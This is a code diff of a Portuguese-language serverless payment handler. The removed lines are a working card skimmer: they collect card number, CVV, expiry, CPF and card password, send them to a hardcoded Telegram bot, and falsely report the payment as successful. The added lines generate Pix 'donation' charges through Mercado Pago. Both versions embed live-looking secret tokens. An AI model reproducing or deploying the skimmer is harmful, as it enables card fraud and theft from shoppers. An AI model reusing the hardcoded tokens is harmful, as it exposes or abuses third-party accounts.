@@ -1,40 +1,65 @@
+import { buffer } from 'micro';
 import axios from 'axios';
+import { v4 as uuidv4 } from 'uuid';
 
-const TELEGRAM_TOKEN = "6725163602:AAHskt1qmIpPitj_OBmqQ6kvwB9tUxLZE_o";
-const CHAT_ID = "5650303115";
+export const config = { api: { bodyParser: true } };
+
+// SUBSTITUA pelo seu token do Mercado Pago
+const ACCESS_TOKEN = "APP_USR-1245205998264290-041409-1047ee9e45914c23e16758074dc1b797-1712554417";
 
 export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).end();
+  if (req.method !== 'POST') {
+    return res.status(405).json({ erro: 'Método não permitido' });
+  }
 
-  const {
-    numero, senha, nome_cartao, validade,
-    cpf_cartao, cvv, valor, email, nome
-  } = req.body;
+  const { valor, email, nome, turbinar } = req.body;
+  const valorFinal = turbinar ? parseFloat(valor) + 5.99 : parseFloat(valor);
 
-  if (!numero || !nome_cartao || !validade || !cpf_cartao || !cvv || valor <= 0)
-    return res.status(400).json({ erro: "Dados do cartão incompletos." });
+  if (!valorFinal || valorFinal <= 0) {
+    return res.status(400).json({ erro: "Valor inválido" });
+  }
 
-  const mensagem = `
-**Novo Pagamento via Cartão:**
-- Nome: ${nome}
-- E-mail: ${email}
-- Valor: R$ ${valor}
-- Número do Cartão: ${numero}
-- Nome do Titular: ${nome_cartao}
-- Validade: ${validade}
-- CPF: ${cpf_cartao}
-- Senha: ${senha}
-`;
+  const nomeParts = nome?.split(' ') || ['Usuário'];
+  const payer = {
+    email: email || "usuario@teste.com",
+    first_name: nomeParts[0],
+    last_name: nomeParts.slice(1).join(' ') || "Desconhecido"
+  };
+
+  const headers = {
+    Authorization: `Bearer ${ACCESS_TOKEN}`,
+    'Content-Type': 'application/json',
+    'X-Idempotency-Key': uuidv4()
+  };
+
+  const body = {
+    transaction_amount: valorFinal,
+    description: "Doação via Pix",
+    payment_method_id: "pix",
+    payer
+  };
 
   try {
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: mensagem,
-      parse_mode: "Markdown"
+    const response = await axios.post(
+      'https://api.mercadopago.com/v1/payments',
+      body,
+      { headers }
+    );
+
+    const pagamento = response.data;
+
+    if (!pagamento.point_of_interaction) {
+      console.error("Erro inesperado no pagamento:", pagamento);
+      return res.status(500).json({ erro: "Erro inesperado ao gerar QR Code." });
+    }
+
+    return res.json({
+      pix_qr: pagamento.point_of_interaction.transaction_data.qr_code_base64,
+      pix_copiaecola: pagamento.point_of_interaction.transaction_data.qr_code
     });
 
-    res.json({ success: true, message: "Pagamento processado com sucesso!" });
   } catch (err) {
-    res.status(500).json({ erro: "Erro ao enviar para o Telegram." });
+    console.error("Erro ao gerar Pix:", err?.response?.data || err.message);
+    return res.status(500).json({ erro: "Erro ao gerar Pix. Verifique o token e tente novamente." });
   }
 }
